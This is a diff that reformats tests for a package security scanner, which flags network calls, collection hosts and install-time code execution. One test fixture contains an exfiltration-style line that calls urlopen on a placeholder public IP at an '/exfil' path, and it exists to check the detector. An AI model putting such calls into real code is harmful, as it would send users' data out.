@@ -135,7 +135,9 @@ def test_network_communication() -> None:
     assert any(h.rule_id == "NET-002" and h.severity == Severity.HIGH for h in res_webhook.hits)
 
     # 3. Hardcoded public IP address -> NET-002 (HIGH)
-    res_ip = scan_python("import urllib.request\nurllib.request.urlopen('http://198.51.100.1:8080/exfil')")
+    res_ip = scan_python(
+        "import urllib.request\nurllib.request.urlopen('http://198.51.100.1:8080/exfil')"
+    )
     assert any(h.rule_id == "NET-002" and h.severity == Severity.HIGH for h in res_ip.hits)
 
     # 4. String containing collection host -> NET-003 (MEDIUM)
@@ -216,12 +218,7 @@ def test_analyze_package_scans_python_files_without_unsupported_language_gaps(
     tmp_path: Path,
 ) -> None:
     """Verify SEC-01: .py files are analyzed and no longer produce UNSUPPORTED_LANGUAGE gaps."""
-    files = {
-        "calculator.py": (
-            "def add(a, b):\n"
-            "    return a + b\n"
-        )
-    }
+    files = {"calculator.py": ("def add(a, b):\n    return a + b\n")}
     pkg_inv = inventory(tmp_path, "pkg", files)
     meta = make_metadata()
 
@@ -229,9 +226,7 @@ def test_analyze_package_scans_python_files_without_unsupported_language_gaps(
     assert analysis.files_scanned == 1
 
     # Ensure no UNSUPPORTED_LANGUAGE gap is created for calculator.py
-    unsupported_gaps = [
-        g for g in analysis.gaps if g.reason == GapReason.UNSUPPORTED_LANGUAGE
-    ]
+    unsupported_gaps = [g for g in analysis.gaps if g.reason == GapReason.UNSUPPORTED_LANGUAGE]
     assert len(unsupported_gaps) == 0
 
 
@@ -292,4 +287,3 @@ def test_analyze_package_detects_install_time_python_execution(tmp_path: Path) -
     corr_005 = next(f for f in analysis.findings if f.rule_id == "CORR-005")
     assert corr_005.runs_at_install is True
     assert corr_005.severity == Severity.HIGH
-
